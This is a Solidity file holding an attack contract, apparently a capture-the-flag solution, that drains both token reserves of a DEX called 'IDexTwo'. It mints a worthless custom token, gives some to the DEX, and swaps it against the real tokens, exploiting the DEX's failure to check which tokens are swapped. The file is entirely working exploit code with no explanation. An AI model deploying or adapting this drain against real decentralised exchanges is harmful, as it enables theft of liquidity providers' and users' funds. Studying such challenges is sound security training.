// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IDexTwo {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function approve(address spender, uint amount) external;
    function getSwapPrice(address, address, uint) external view returns(uint);
    function swap(address from, address to, uint amount) external;
}

contract PwnToken is ERC20 {
    constructor(IDexTwo dex) ERC20("PwnToken", "PWN") {
        _mint(msg.sender, 400);
        _mint(address(dex), 100);
    }
}

contract Pwn {

    IDexTwo private immutable dex;
    ERC20 private immutable token1;
    ERC20 private immutable token2;   
    ERC20 private immutable pwnToken;   

    constructor(IDexTwo _dex, ERC20 _pwnToken) {
        dex = _dex;
        token1 = ERC20(dex.token1());
        token2 = ERC20(dex.token2());
        pwnToken = _pwnToken;
    }  

    function pwn() external {
        pwnToken.transferFrom(msg.sender, address(this), 400);
        pwnToken.approve(address(dex), 400);
        dex.swap(address(pwnToken), address(token1), 100);
        dex.swap(address(pwnToken), address(token2), 200);
        require(token1.balanceOf(address(dex)) == 0 && token2.balanceOf(address(dex)) == 0, "tokens not drained");
    }
}